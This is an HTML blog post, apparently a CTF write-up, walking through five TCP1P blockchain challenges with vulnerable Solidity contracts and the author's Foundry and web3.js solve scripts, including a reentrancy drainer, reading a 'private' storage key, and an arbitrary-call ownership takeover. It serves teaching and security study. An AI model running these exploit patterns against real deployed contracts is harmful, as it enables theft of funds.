@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>Blog | TCP1P-CTF Blockchain writeups</title>
+  <link rel="stylesheet" href="/blog/assets/css/mark.css" />
+  <link rel="stylesheet" href="/blog/assets/css/custom.css" />
+  <!-- PILL JS LOADER SYLE -->
+  <style>
+    #indicator {
+      position: fixed;
+      top: 0;
+      right: 0;
+      left: 0;
+      height: 3px;
+      display: none;
+      background-color: #72b6b5;
+    }
+
+    .is-loading {
+      display: block;
+      animation: blink 1.5s linear infinite;
+    }
+
+    @keyframes blink {
+      from,
+      to {
+        background-color: #72b6b5;
+      }
+
+      50% {
+        background-color: #42b983;
+      }
+    }
+
+    #project-link {
+      display: block;
+      position: fixed;
+      padding: 8px;
+      top: 0;
+      right: 0;
+    }
+  </style>
+  <!-- PILL JS -->
+  <script src="/blog/assets/js/pill.min.js"></script>
+  <script>
+    // this is for pill js as the normal link wont work
+    function openLink(url) {
+      window.open(url, "_blank");
+    }
+  </script>
+</head>
+
+  <body>
+    <div id="indicator"></div>
+    <div id="page">
+      <style>
+        .title {
+          padding: 5%;
+          color: #101417;
+          font-size: 18px;
+          font-weight: bold;
+          text-align: center;
+          background: #f78e66;
+          display: grid;
+        }
+      </style>
+      <!-- header -->
+      <header>
+	<a href="/blog/">
+		<h3>Blog</h3>
+	</a>
+</header>
+
+      <!-- nav -->
+      <nav>
+	
+		
+			<a href="/blog/">Home</a>
+		
+	
+		
+			<a href="/blog/about">About</a>
+		
+	
+</nav>
+      <!-- page content -->
+      <main class="content">
+        <p class="title">
+          TCP1P-CTF Blockchain writeups
+        </p>
+        <p>This weekend I participated in the TCP1P Capture the flag cybersecurity contest and together with my personal CTF team <a href="https://xatha.org">Xor and the half adder</a> we managed to get placed at 15 out of 1110.</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/tcp1p-board.png" alt="scoreboard" /></p>
+
+<p>What caught my interest was mainly the blockchain challenges since it’s rather an obscure technology when it comes to most CTFs.</p>
+
+<p>To interact with the challenges each player got their own dedicated rpc that they can connect to avoid solution leakage since everything is public on the blockchain
+<img src="https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/tcp1p-blockchain-deploy.png" alt="deployment" />
+and each contract was deployed using a Setup contract such as the following:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+import { HCOIN } from "./HCOIN.sol";
+
+contract Setup {
+    HCOIN public coin;
+    address player;
+
+    constructor() public payable {
+        require(msg.value == 1 ether);
+        coin = new HCOIN();
+        coin.deposit{value: 1 ether}();
+    }
+
+    function setPlayer(address _player) public {
+      require(_player == msg.sender, "Player must be the same with the sender");
+      require(_player == tx.origin, "Player must be a valid Wallet/EOA");
+      player = _player;
+    }
+
+    function isSolved() public view returns (bool) {
+        return coin.balanceOf(player) &gt; 1000 ether; // im rich :D
+    }
+}
+</code></pre>
+
+<p>so the goal is to make the <code class="language-plaintext highlighter-rouge">isSolved</code> function return true</p>
+
+<p>for solving the challenges I have used the <a href="https://book.getfoundry.sh">foundry toolkit</a> mainly because you can write your own exploit scripts in pure solidity which saves a lot of time and gets rid of type conversion errors.</p>
+
+<h1 id="babyerc20">babyERC20</h1>
+<p>this challenge has a high number of solves so I assume it was a warmup to test the connection to the chain.</p>
+
+<p>we are given a basic ERC20 contract (the uninteresting parts are shortened to save space)</p>
+
+<pre><code class="language-solidity">pragma solidity 0.6.12; // this version is older than 0.8.0 so the contract is vulnerable to integer overflow
+
+contract HCOIN is Ownable {
+    function deposit() public payable {
+        balanceOf[msg.sender] += msg.value;
+    }
+    function transfer(address _to, uint256 _value) public returns (bool success) {
+        require(_to != address(0), "ERC20: transfer to the zero address");
+        require(balanceOf[msg.sender] - _value &gt;= 0, "Insufficient Balance");
+        balanceOf[msg.sender] -= _value;
+        balanceOf[_to] += _value;
+        return true;
+    }
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        ...
+    }
+    function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
+        require(allowance[_from][msg.sender] &gt;= _value, "Allowance exceeded");
+        require(_to != address(0), "ERC20: transfer to the zero address");
+        require(balanceOf[msg.sender] - _value &gt;= 0, "Insufficient Balance");
+        balanceOf[_from] -= _value;
+        balanceOf[_to] += _value;
+        allowance[_from][msg.sender] -= _value;
+        ...
+    }
+    fallback() external payable {
+        deposit();
+    }
+
+}
+</code></pre>
+
+<p>so after reading the contract I assumed there’s an integer overflow somewhere in the transfers or the approval but to my surprise when I queried my account balance I saw this:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>cast balance <span class="s2">"&lt;wallet address&gt;"</span> <span class="nt">--rpc-url</span> <span class="s2">"&lt;rpc&gt;"</span>
+5000000000000000000000 <span class="c"># 5000e18</span>
+</code></pre></div></div>
+<p>so we don’t really need any hacks I can just transfer my ether to the contract
+originally I just transferred 3000 eth to the contract using metamask but for the writeup I made this foundry solve script</p>
+<pre><code class="language-solidity">import {Script, console} from "forge-std/Script.sol";
+import {Setup} from "../contracts/Setup.sol";
+import {HCOIN} from "../contracts/HCOIN.sol";
+contract pwnScript is Script {
+    Setup setup;
+    HCOIN coin;
+
+    function setUp() public {
+        setup = Setup(0x037B6CD5Ad7D49c637be4cfD94572b405f4E0783);
+        coin = HCOIN(setup.coin());
+    }
+
+    function run() public {
+        vm.startBroadcast();
+        setup.setPlayer(msg.sender); //set the player to my address
+        coin.deposit{value: 3000 ether}();
+        console.log(setup.isSolved()); //check if everything is ok
+        vm.stopBroadcast();
+    }
+}
+</code></pre>
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/imagesf/tcp1p/babyerc-solve.png" alt="solve" /></p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge script script/exploit.s.sol <span class="nt">--rpc-url</span> <span class="s2">"&lt;rpc&gt;"</span> <span class="nt">--private-key</span> <span class="s2">"&lt;your private key&gt;"</span>
+</code></pre></div></div>
+
+<h1 id="injus-gambit">Inju’s Gambit</h1>
+
+<p>This challenge was more of a misc challenge to me.
+but nonetheless the solution was interested
+in this challenge we have 2 contracts:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Privileged</code>: contract handling the access control restrictions and the privileges</li>
+  <li><code class="language-plaintext highlighter-rouge">ChallengeManager</code>: a contract that grants privileges to other parties</li>
+</ul>
+
+<p>the goal in <code class="language-plaintext highlighter-rouge">Setup.sol</code> was this :</p>
+<pre><code class="language-solidity">function isSolved() public view returns(bool){
+        return address(privileged.challengeManager()) == address(0);
+}
+</code></pre>
+
+<p>Luckily <code class="language-plaintext highlighter-rouge">Privileged.sol</code> contains this function:</p>
+<pre><code class="language-solidity">function fireManager() public onlyOwner{
+        challengeManager = address(0);
+}
+</code></pre>
+
+<p>Looks easy we just need to bypass the modifier:</p>
+<pre><code class="language-solidity">modifier onlyOwner() {
+        if(msg.sender != casinoOwner){
+            revert Privileged_NotHighestPrivileged();
+        }
+        _;
+}
+</code></pre>
+
+<p>So in order to become the owner we need to interact with the <code class="language-plaintext highlighter-rouge">ChallengeManager</code></p>
+<pre><code class="language-solidity">function approach() public payable {
+        if(msg.value != 5 ether){
+            revert CM_NotTheCorrectValue();
+        }
+        if(approached[msg.sender] == true){
+            revert CM_AlreadyApproached();
+        }
+        approached[msg.sender] = true;
+        challenger.push(msg.sender);
+        privileged.mintChallenger(msg.sender);
+}
+</code></pre>
+<p>we just need to deposit 5 ether to start the challenge
+but the next step is to upgrade our privileges</p>
+<pre><code class="language-solidity">function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
+        //makes sure a valid id is being used
+        if (challengerId &gt; privileged.challengerCounter()){ 
+            revert CM_InvalidIdOfChallenger();
+        }
+        //same as before
+        if(strangerId &gt; privileged.challengerCounter()){
+            revert CM_InvalidIdofStranger();
+        }
+        //you can only challenge using your own account
+        if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
+            revert CM_CanOnlyChangeSelf();
+        }
+
+        //calculates a somewhat random hash using the block.timestamp as a seed
+        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
+
+        if (gacha == 0){ //upgrade the stranger
+            if(privileged.getRequirmenets(strangerId).isRich == false){
+                privileged.upgradeAttribute(strangerId, true, false, false, false);
+            }else if(privileged.getRequirmenets(strangerId).isImportant == false){
+                privileged.upgradeAttribute(strangerId, true, true, false, false);
+            }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
+                privileged.upgradeAttribute(strangerId, true, true, true, false);
+            }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
+                privileged.upgradeAttribute(strangerId, true, true, true, true);
+                qualifiedChallengerFound = true;
+                theChallenger = privileged.getRequirmenets(strangerId).challenger;
+            }
+        }else if (gacha == 1){ //upgrade the challenger
+            if(privileged.getRequirmenets(challengerId).isRich == false){
+                privileged.upgradeAttribute(challengerId, true, false, false, false);
+            }else if(privileged.getRequirmenets(challengerId).isImportant == false){
+                privileged.upgradeAttribute(challengerId, true, true, false, false);
+            }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
+                privileged.upgradeAttribute(challengerId, true, true, true, false);
+            }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
+                privileged.upgradeAttribute(challengerId, true, true, true, true);
+                qualifiedChallengerFound = true;
+                theChallenger = privileged.getRequirmenets(challengerId).challenger;
+            }
+        }else if(gacha == 2){ // nuke the challenger
+            privileged.resetAttribute(challengerId);
+            qualifiedChallengerFound = false;
+            theChallenger = address(0);
+        }else{
+            //nuke the strager
+            privileged.resetAttribute(strangerId);
+            qualifiedChallengerFound = false;
+            theChallenger = address(0);
+        }
+    }
+</code></pre>
+
+<p>What caught my eye first was that there’s no check whether <code class="language-plaintext highlighter-rouge">stangerId == challengerId</code> which implies we can just challenge ourselve and account for the 0 and 1 cases as one.</p>
+
+<p>So now how can I time this function properly to elevate my privileges ?
+at the beginning I experimented with just randomly spamming <code class="language-plaintext highlighter-rouge">upgradeChallengerAttribute(myid,myid)</code> and after a couple of tries I managed to get it through but this solution wasn’t satisfying neither interesting so I wrote a solve script with foundry again :P</p>
+
+<p>after that we are left with the last part of the ChallengeManager.sol contract:</p>
+<pre><code class="language-solidity">bytes32 private masterKey;
+function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
+        if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
+            privileged.setNewCasinoOwner(address(theChallenger));
+        }        
+    }
+</code></pre>
+
+<blockquote>
+  <p>YOU: Oh no it’s a private variable what are we gonna dooo ????? <br /></p>
+</blockquote>
+
+<blockquote>
+  <p>ME: Chillout it’s the blockchain ;)</p>
+</blockquote>
+
+<p>private is a non-existent term when it comes to the blockchain, we can easily read any value using web3.js</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">web3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Web3</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;rpc&gt;</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getStorageAt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x9d9842E37E5e6786D07aa4AD7173488b7D247d9B</span><span class="dl">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">v</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">v</span><span class="p">)))</span>
+<span class="o">&gt;</span><span class="mh">0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559</span>
+</code></pre></div></div>
+<p>we read the index 1 because that’s where the masterkey variable is stored in the memory of the smart contract</p>
+
+<p>and now we put it all together here
+you might have to run it twice if you aren’t lucky enough just due to randomness
+there are better ways to estimate the precise moment but do you really care ??</p>
+
+<pre><code class="language-solidity">// the setup part was the same as the previous one so I emitted here to save space
+
+function run() public {
+        vm.startBroadcast();
+        if (!ch.approached(msg.sender)){
+            ch.approach{value: 5e18}();
+        }
+        uint256 gacha = uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4;
+        //check 
+        if (gacha == 0 || gacha == 1) {
+            uint i = 0;
+            while (i != 4){
+                ch.upgradeChallengerAttribute(3, 3); //assuming we are the 3rd challenge after the setup script
+                i++;
+            }
+            ch.challengeCurrentOwner(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559);
+            p.fireManager();
+        }
+        vm.stopBroadcast();
+}
+</code></pre>
+
+<h1 id="money-captcha">Money Captcha</h1>
+
+<p>The goal here was to drain the <code class="language-plaintext highlighter-rouge">moneyContract</code>:</p>
+<pre><code class="language-solidity">function isSolved() public view returns (bool) {
+        return address(moneyContract).balance == 0;
+}
+</code></pre>
+
+<p>As you can see the challenge is the regular reentrancy bug.</p>
+
+<pre><code class="language-solidity">contract Money {
+    // unnecessary code is emitted for better readibility
+    
+    uint256 public immutable secret = uint256(blockhash(block.prevrandao));
+    function save() public payable {
+        require(msg.value &gt; 0, "You don't have money XP");
+        balances[msg.sender] += msg.value;
+    }
+
+    //vulnerable function 
+    function load(uint256 userProvidedCaptcha) public { 
+        uint balance = balances[msg.sender];
+        require(balance &gt; 0, "You don't have money to load XD");
+
+        uint256 generatedCaptcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp)));
+        require(userProvidedCaptcha == generatedCaptcha, "Invalid captcha");
+        //vulnerable code
+        (bool success,) = msg.sender.call{value: balance}("");
+        require(success, 'Oh my god, what is that!?');
+        balances[msg.sender] = 0;
+    }
+}
+</code></pre>
+
+<p>reentrancy must be exploited by deploying another contract so here’s mine:</p>
+<pre><code class="language-solidity">contract Pwner {
+    Money public moneyContract;
+    Captcha public captchaContract;
+    bool public pwned = false;
+    constructor(Money _moneyContract, Captcha _captchaContract) {
+        moneyContract = _moneyContract;
+        captchaContract = _captchaContract;
+        
+    }
+
+    function pwn() public payable{
+        moneyContract.save{value: msg.value}();
+        uint256 captcha = uint256(keccak256(abi.encodePacked(moneyContract.secret(), block.number, block.timestamp)));
+        moneyContract.load(captcha);
+    }
+
+    receive() external payable {
+        //make sure I don't get stuck at an infinite loop, may not be necessary but better be safe than sorry
+        if (!pwned){
+            pwned = true;
+            uint256 captcha = uint256(keccak256(abi.encodePacked(moneyContract.secret(), block.number, block.timestamp)));
+            moneyContract.load(captcha);
+        }else {
+            pwned = false;
+        }
+    }
+}
+</code></pre>
+<p>And that’s it for this challenge</p>
+
+<h1 id="executive-problem">Executive Problem</h1>
+
+<p>This challenge had 2 contracts:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Crain.sol</code>: basic contract with one restricted function for changing the owner</li>
+  <li><code class="language-plaintext highlighter-rouge">CrainExecutive.sol</code>: Permission contract for managing the ownership of the <code class="language-plaintext highlighter-rouge">Crain.sol</code> contract</li>
+</ul>
+
+<p>the goal is to gain ownership of the <code class="language-plaintext highlighter-rouge">Crain.sol</code></p>
+<pre><code class="language-solidity">function isSolved() public view returns(bool){
+        return crain.crain() != address(this);
+}
+</code></pre>
+
+<p>so our target is the CraineExecutive contract initially:</p>
+<pre><code class="language-solidity">contract CrainExecutive{
+
+    function claimStartingBonus() public _onlyOnePerEmployee{
+        balanceOf[owner] -= 1e18;
+        balanceOf[msg.sender] += 1e18;
+    }
+
+    function becomeEmployee() public {
+        isEmployee[msg.sender] = true;
+    }
+
+    function becomeManager() public _onlyEmployee{
+        require(balanceOf[msg.sender] &gt;= 1 ether, "Must have at least 1 ether");
+        require(isEmployee[msg.sender] == true, "Only Employee can be promoted");
+        isManager[msg.sender] = true;
+    } 
+
+    function becomeExecutive() public {
+        require(isEmployee[msg.sender] == true &amp;&amp; isManager[msg.sender] == true);
+        require(balanceOf[msg.sender] &gt;= 5 ether, "Must be that Rich to become an Executive");
+        isExecutive[msg.sender] = true;
+    }
+
+    function buyCredit() public payable _onlyEmployee{
+        require(msg.value &gt;= 1 ether, "Minimum is 1 Ether");
+        uint256 totalBought = msg.value;
+        balanceOf[msg.sender] += totalBought;
+        totalSupply += totalBought;
+    }
+
+    function sellCredit(uint256 _amount) public _onlyEmployee{
+        require(balanceOf[msg.sender] - _amount &gt;= 0, "Not Enough Credit");
+        uint256 totalSold = _amount;
+        balanceOf[msg.sender] -= totalSold;
+        totalSupply -= totalSold;
+    }
+    //vulnerable function
+    function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
+        require(to != address(0), "Invalid Recipient");
+        require(balanceOf[msg.sender] - _amount &gt;= 0, "Not enough Credit");
+        uint256 totalSent = _amount;
+        balanceOf[msg.sender] -= totalSent;
+        balanceOf[to] += totalSent;
+        //vulnerable code that allows anyone to call any address on behalf of the contract
+        (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
+        require(transfered, "Failed to Transfer Credit!");
+    }
+
+}
+</code></pre>
+<p>So we just have to call the functions in the correct order to get <code class="language-plaintext highlighter-rouge">Executive</code> role afterwards we can abuse 
+the functionality to call the <code class="language-plaintext highlighter-rouge">crain.ascendToCrain</code> function to take over the <code class="language-plaintext highlighter-rouge">Crain.sol</code> contract</p>
+
+<p>So I put everything in a solve script:</p>
+
+<pre><code class="language-solidity">function run() public {
+        Crain crain = setup.crain();
+        CrainExecutive ce = setup.cexe();
+        vm.startBroadcast();
+        ce.becomeEmployee();
+        ce.claimStartingBonus();
+        ce.becomeManager();
+        ce.buyCredit{value: 5 ether}();
+        ce.becomeExecutive();
+        bytes memory data = abi.encodeWithSignature("ascendToCrain(address)", msg.sender);
+        ce.transfer(address(crain), 0 ether, data);
+        vm.stopBroadcast();
+    }
+</code></pre>
+
+<h1 id="minecraft-huh">Minecraft huh</h1>
+
+<p>In my opinion this challenge had potential to be much more interesting but it ended up being quite easy
+to solve</p>
+
+<p>Initially we get the description but without any contracts:
+<img src="https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-desc.png" alt="description" /></p>
+
+<p>My first thoughts were whether the authors forgot to add the source code or not, nonethless I started doing basic enumeration using <code class="language-plaintext highlighter-rouge">web3.js</code> on the chain.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">Web3</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">web3</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">w3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Web3</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://ctf.tcp1p.team:44555/7d491d19-9706-4dca-a599-43f65aecd053</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="k">await</span> <span class="nx">w3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getBlock</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>The result was quite interesting since the block number was 8 unlike the challenges from before which all had only one block mined.</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-blocks.png" alt="the blocks" /></p>
+
+<p>so I took a look at the first block after the gensis</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">w3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getBlock</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="nl">hash</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0xdea377425bfecf29d3675fedc611d5a0e58133ad07b55b7c10727fcd01706a76</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">parentHash</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0xa69b4c1826293f2c8e291feab0c65c8a86cc6945fb595e8b0ad9f5460c354582</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">sha3Uncles</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">miner</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x0000000000000000000000000000000000000000</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">stateRoot</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0xd65448f21a330d2454d7e3ee63a370f55dbe74c582d7a5a0a89d1bb18656a367</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">transactionsRoot</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x4e89445408d7569031b3f1cf080d67e3ef00559509c274e4a792b5ded7c7c4b1</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">receiptsRoot</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0xfb3db4be5cb9ad4a0c55651a1adcd83c43ce7a226c2f4394a417526a3ea01ef2</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">logsBloom</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x00.....</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">difficulty</span><span class="p">:</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">number</span><span class="p">:</span> <span class="mi">1</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">gasLimit</span><span class="p">:</span> <span class="mi">30000000</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">gasUsed</span><span class="p">:</span> <span class="mi">376770</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">timestamp</span><span class="p">:</span> <span class="mi">1728849080</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">totalDifficulty</span><span class="p">:</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">extraData</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">mixHash</span><span class="p">:</span> <span class="dl">'</span><span class="s1">0x0000000000000000000000000000000000000000000000000000000000000000</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">nonce</span><span class="p">:</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">baseFeePerGas</span><span class="p">:</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">blobGasUsed</span><span class="p">:</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">excessBlobGas</span><span class="p">:</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span>
+  <span class="nx">uncles</span><span class="p">:</span> <span class="p">[],</span>
+  <span class="nx">transactions</span><span class="p">:</span> <span class="p">[</span>
+    <span class="dl">'</span><span class="s1">0x493554a088aac4c1a7f6aa11971df07cf213d40163f4bb5788653c21da59f443</span><span class="dl">'</span>
+  <span class="p">],</span>
+  <span class="nx">size</span><span class="p">:</span> <span class="mi">2275</span><span class="nx">n</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>we have only one transaction mined good let’s take a further look</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">w3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getTransaction</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x493554a088aac4c1a7f6aa11971df07cf213d40163f4bb5788653c21da59f443</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>interesting enough we see what looks like a contract deployment</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-contract-deploy.png" alt="Contract Deployment" /></p>
+
+<blockquote>
+  <p>Interesting…</p>
+</blockquote>
+
+<p>I felt adventurous so why not decompile it</p>
+
+<p>for the decompilation I used a mixture of decompilers, manual guesses and ofcourse chatgpt
+and I ended up with this result.</p>
+<pre><code class="language-solidity">pragma solidity ^0.8.28;
+
+contract Setup {
+    ChallengeContract public ChallengeContract;
+
+    constructor() {
+        // Deploy the secondary contract with 1 ether
+        ChallengeContract = new ChallengeContract{value: 1 ether}();
+    }
+
+    function isSolved() external pure returns (uint256) {
+        return 0;
+    }
+}
+
+contract ChallengeContract {
+    string private storedString;
+
+    constructor() payable {
+        storedString = "thisIsTheFirstOneIsntIt";
+    }
+
+    function setString(string memory newString) external {
+        storedString = newString;
+    }
+}
+</code></pre>
+
+<p>Quite simple functionality but like what’s the challenge here ?
+At this stage I just ran through the blocks for further investigation maybe there are more contracts right ?</p>
+
+<p>The second transaction was this:</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-contract-2nd.png" alt="Second transaction" /></p>
+
+<p>it looks like a function call to <code class="language-plaintext highlighter-rouge">setString</code>, after further investigation it looked like all of the remaining blocks had the same call to setString but with different parameters.
+So the solution is obvious at this point, one of those <code class="language-plaintext highlighter-rouge">setString</code> calls has the flag.</p>
+
+<p>I made this script to speed things up with <code class="language-plaintext highlighter-rouge">web3.js</code>:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">Web3</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">web3</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">w3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Web3</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;rpc&gt;</span><span class="dl">"</span><span class="p">);</span>
+
+
+<span class="kd">const</span> <span class="nx">solve</span> <span class="o">=</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="c1">//skip the contract deployment block</span>
+    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="kd">const</span> <span class="nx">block</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">w3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getBlock</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+        <span class="kd">const</span> <span class="nx">txHash</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">transactions</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">//there's only one transaction in each block</span>
+        <span class="kd">const</span> <span class="nx">tx</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">w3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getTransaction</span><span class="p">(</span><span class="nx">txHash</span><span class="p">);</span>
+        <span class="kd">const</span> <span class="nx">argument</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">input</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">136</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">argument</span><span class="p">,</span> <span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">).</span><span class="nf">toString</span><span class="p">());</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="nf">solve</span><span class="p">();</span>
+
+</code></pre></div></div>
+<p>we got the output</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> TCP3P{this_is_one_p_not_three_p} //fake flag pretty lame 
+h I changed my mind again!
+Nah That does not sound good
+
+TCP1P.....
+,TCP1P{running_through_some_blocks_have_you?}
+That is lame, nevermind
+
+</code></pre></div></div>
+
+<p>And that’s it for now, if you would like to reach out to me on discord and ask further question you can hit me up on <code class="language-plaintext highlighter-rouge">@pop_eax</code>.</p>
+
+      </main>
+
+      <!-- footer -->
+      <footer>
+	<p>
+		Secure all the things !!!!
+	</p>
+	<p>
+		&copy 2021 | Blog
+	</p>
+</footer>
+<script src='/blog/assets/js/site.js' id="pill_site_script" type='module'></script>
+    </div>
+  </body>
+</html>
